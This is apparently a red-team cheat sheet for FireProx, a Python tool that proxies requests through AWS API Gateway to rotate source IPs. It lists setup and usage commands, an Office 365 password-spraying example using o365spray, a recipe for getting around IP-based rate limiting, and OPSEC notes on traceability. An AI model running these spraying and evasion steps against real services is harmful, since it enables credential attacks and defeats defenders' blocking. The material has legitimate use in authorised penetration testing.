# FireProx

**Type:** Python Tool
**Purpose:** AWS API Gateway for rotating source IP addresses
**Platform:** Linux, macOS, Windows
**Tags:** #aws #proxy #evasion #ip-rotation #api-gateway #rate-limit-bypass

---

## Installation & Setup

```bash
# Clone repository
git clone https://github.com/ustayready/fireprox.git
cd fireprox

# Install dependencies
pip3 install -r requirements.txt

# Requires AWS credentials configured
aws configure
```

---

## Quick Reference

```bash
# Create proxy URL
python3 fire.py --command create --url https://example.com

# List existing proxies
python3 fire.py --command list

# Delete proxy
python3 fire.py --command delete --api_id <api-id>

# Update proxy URL
python3 fire.py --command update --api_id <api-id> --url https://newurl.com
```

---

## EVASION: Create API Gateway Proxy

```bash
# Create proxy for target URL
python3 fire.py --command create --url https://login.microsoftonline.com/

# Returns API Gateway URL:
# https://abc123.execute-api.us-east-1.amazonaws.com/fireprox/

# Use this URL instead of original
# Each request comes from different AWS IP
```

---

## Common Use Cases

### O365 Password Spraying
```bash
# Create proxy for Office 365
python3 fire.py --command create --url https://login.microsoftonline.com/

# Use with o365spray
o365spray --spray -U users.txt -p 'Password!' --proxy-url https://xyz.execute-api.us-east-1.amazonaws.com/fireprox/ --domain company.com
```

### Bypassing IP-Based Rate Limiting
```bash
# Target blocks after N requests from same IP
# FireProx rotates source IP using AWS infrastructure

# Create proxy
python3 fire.py --command create --url https://target-api.com/

# Use proxy URL for requests
curl https://abc.execute-api.region.amazonaws.com/fireprox/endpoint
```

---

## Management

```bash
# List all proxies
python3 fire.py --command list

# Delete proxy
python3 fire.py --command delete --api_id abc123

# Update target URL
python3 fire.py --command update --api_id abc123 --url https://new-target.com/
```

---

## Pro Tips

💡 **IP Rotation**: Each request comes from different AWS IP range
💡 **Rate Limit Bypass**: Bypasses IP-based rate limiting
💡 **AWS Costs**: Minimal AWS API Gateway costs
💡 **Regional**: Can specify AWS region for proxy
💡 **Integration**: Works with o365spray, other tools via `--proxy-url`
💡 **Clean Up**: Delete proxies when done to avoid AWS charges

---

## OPSEC

✅ **Advantages**: Legitimate AWS infrastructure, hard to block all AWS IPs
⚠️ **Considerations**: Requires AWS account (can be traced back if investigated)

---

## Resources

- GitHub: https://github.com/ustayready/fireprox
- Author: @ustayready (Mike Felch)
